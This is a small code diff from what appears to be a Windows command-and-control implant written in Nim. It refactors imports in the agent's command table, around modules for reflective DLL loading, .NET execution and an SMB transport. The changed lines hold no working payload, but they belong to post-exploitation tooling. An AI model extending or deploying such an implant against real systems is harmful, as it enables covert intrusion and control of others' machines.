@@ -2,12 +2,11 @@ import winim/lean
 import tables, strformat, strutils
 import ../../../common/[serialize, utils]
 import ../../../types/[common, agent, protocol]
-import ../utils/io
+import ../utils/[io, metadata]
 import ../protocol/result
 import ./[exit, job]
 import ./transport/smb
 
-const MODULES* {.intdefine.} = 0
 var commands* = newTable[CommandType, proc(ctx: AgentCtx, task: Task): TaskResult]()
 
 # Assign the "not implemented" function to all commands by default
@@ -251,7 +250,7 @@ when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_DLL)) == cast[uint32](MODULE_DLL)):
-    import ../utils/[rdll, beacon]
+    import ../utils/rdll
     
     proc dllJob(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
         var unpacker = Unpacker.init(Bytes.toString(task.args[0].data))
